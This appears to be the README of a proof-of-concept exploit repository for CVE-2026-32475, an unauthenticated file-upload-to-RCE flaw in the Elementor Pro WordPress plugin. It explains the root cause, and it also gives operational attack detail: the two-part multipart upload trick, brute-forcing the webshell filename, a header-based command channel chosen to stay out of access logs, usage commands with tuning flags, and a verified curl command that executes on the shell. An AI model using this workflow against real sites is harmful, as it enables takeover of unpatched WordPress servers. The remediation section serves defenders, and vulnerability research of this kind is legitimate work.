# CVE-2026-32475 — Elementor Pro Unauthenticated Arbitrary File Upload → RCE

Proof-of-concept for **CVE-2026-32475** (CVSS 9.0): an unauthenticated arbitrary file
upload vulnerability in the **Elementor Pro** WordPress plugin (≤ 4.2.1) that leads to
remote code execution.

| | |
|---|---|
| **CVE** | CVE-2026-32475 |
| **CVSS** | 9.0 Critical |
| **CWE** | CWE-434 (Unrestricted Upload of File with Dangerous Type) |
| **Auth required** | None |
| **Affected** | Elementor Pro ≤ 4.2.1 |
| **Fixed** | Elementor Pro 4.2.2 (2026-08-19) |
| **Reporter** | Tin Pham (TF1T), via Patchstack Bug Bounty Program |

## Attack flow

```
Unauthenticated visitor
        │
        ▼
Elementor Form page (File Upload field)
        │
        ▼
multipart/form-data POST → admin-ajax.php
        │
        ├── part #1: empty file
        │      └─► validation(): UPLOAD_ERR_NO_FILE → return   ◄── validation STOPS here
        │
        └── part #2: shell.php
               └─► never type-checked
                       │
                       ▼
               process_field(): continue → moves the .php payload anyway
                       │
                       ▼
        wp-content/uploads/elementor/forms/<uniqid>.php
                       │
                       ▼
              GET that URL  ⇒  RCE
```

## Root cause — the two loops disagree

The Forms module processes each uploaded entry in two separate passes with different
loop semantics:

```
validation()                              process_field()
────────────                              ──────────────
foreach files as file:                    foreach files as file:
    if empty(file):                           if empty(file):
        add_error(...)                            continue          ◄─ skips only this entry
        return                                move_uploaded_file(...)  ◄─ moves the rest
```

`validation()` aborts on the first entry whose error is `UPLOAD_ERR_NO_FILE`, so the
`.php` entry that follows is never type-checked. `process_field()` merely skips that
empty entry and still moves every subsequent one into the public uploads directory.
The validator reports failure while the mover proceeds — the desynchronization between
the two loops *is* the vulnerability.

Vulnerable code (`modules/forms/fields/upload.php`, ≤ 4.2.1):

```php
// validation()
if ( ! $field['required'] && UPLOAD_ERR_NO_FILE === $file['error'] ) {
    return;                                   // ← aborts the whole loop
}

// process_field()
if ( UPLOAD_ERR_NO_FILE === $file['error'] ) {
    continue;                                 // ← only skips this entry
}
...
$file_extension = pathinfo( $file['name'], PATHINFO_EXTENSION );
$filename = uniqid() . '.' . $file_extension; // attacker-controlled extension survives
move_uploaded_file( $file['tmp_name'], $new_file );
```

The fix in 4.2.2 makes the two loops agree — the empty entry no longer terminates
validation early, so the `.php` entry is type-checked and rejected.

## What this PoC does

1. Fetches the target form page and scrapes `post_id`, `form_id` and the upload field id.
2. Sends the two-part malicious multipart POST to `admin-ajax.php`
   (`action=elementor_pro_forms_send_form`).
3. Recovers the shell URL by sweeping the predictable `<uniqid>` filename space
   (see [`analysis.md`](analysis.md) for the full uniqid → filename mapping).
4. Executes the requested command through the uploaded webshell via an HTTP header and
   prints the output.

### Why the webshell uses a header for commands

The shell reads its command from an `X-CMD` request header (base64-decoded) instead of a
query-string/POST parameter. This is only to keep the command transport separate from the
form parameters and out of typical access-log query strings — it has no bearing on the
vulnerability itself.

## Usage

```bash
python3 el_rce_poc.py --url http://TARGET \
    --page-url http://TARGET/upload-form/ \
    --command "id; hostname; uname -a"
```

Python 3 stdlib only. Tuning flags:

| Flag | Default | Meaning |
|---|---|---|
| `--probe-seconds` | `0.05` | uniqid microsecond window to sweep (seconds) |
| `--step-us` | `2000` | microseconds between probes |
| `--workers` | `24` | concurrent probe threads |
| `--field-id` | auto | set manually when automatic discovery of the upload field fails |

**Note on slow targets:** the probe phase can be heavy for the target (thousands of
requests). On small devices hosting both target and attacker, the web server may drop
concurrent submissions — run with `--probe-seconds 0` to prove the arbitrary-upload
primitive only, then locate and verify the dropped `.php` under
`wp-content/uploads/elementor/forms/` directly on the target.

## Result states

The PoC separates two independent milestones:

```
Arbitrary upload primitive   →   PASS / FAIL
Filename recovery (uniqid)   →   PASS / PARTIAL
RCE confirmation             →   PASS (both above succeeded)
```

Exit code `0` means full RCE confirmation. Exit code `2` means the upload primitive was
proven but the filename could not be guessed within the window (verify the dropped
`.php` under `wp-content/uploads/elementor/forms/` manually).

## Lab (reproduce)

See [`docker-compose.yml`](docker-compose.yml). Full steps:

```bash
# 1) start WordPress + MariaDB
docker compose up -d
# wait ~30s for the DB, then install WordPress
docker compose run --rm wpcli wp core install \
    --url=http://localhost:8090 --title="Lab" --skip-email \
    --admin_user=admin --admin_password=admin123! --admin_email=admin@lab.local

# 2) install free Elementor
docker compose run --rm wpcli wp plugin install elementor --activate

# 3) install vulnerable Elementor Pro (<= 4.2.1).
#    Elementor Pro is a paid plugin — place your legally obtained
#    elementor-pro.zip (e.g. 4.2.1) next to docker-compose.yml first:
docker compose run --rm wpcli wp plugin activate elementor-pro \
    || docker compose exec wordpress bash -c \
       "cd wp-content/plugins && unzip -o /var/www/html/epr.zip"

# 4) create the form page (the PoC repo ships setup_form_page.php):
docker cp setup_form_page.php wp-lab:/tmp/setup.php
docker compose exec wordpress php -r 'require "/var/www/html/wp-load.php"; include "/tmp/setup.php";'

# 5) run the PoC
python3 el_rce_poc.py --url http://localhost:8090 --page-url "http://localhost:8090/?page_id=<ID>"
```

## Verified output (local ARM64 lab)

Upload primitive confirmed — payload dropped as `<uniqid>.php`:

```
$ ls wp-content/uploads/elementor/forms/
6a8cebf002529.php
```

RCE confirmed by requesting the dropped shell:

```
$ curl http://localhost:8090/wp-content/uploads/elementor/forms/<uniqid>.php \
    -H "X-CMD: $(echo 'id && hostname' | base64)"
POC-RCE-OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
26564238432c
```

## Remediation

Update Elementor Pro to **4.2.2+**. Until then, remove File Upload fields from public
forms or restrict form submission by WAF rule.

## References

- Patchstack: Critical unauthenticated file upload to RCE in Elementor Pro
- CVE-2026-32475 (CVSS 9.0, CWE-434), fixed in Elementor Pro 4.2.2 (2026-08-19)
- Reported by Tin Pham (TF1T) via Patchstack Bug Bounty Program

## Disclaimer

For authorized security research and lab use only.
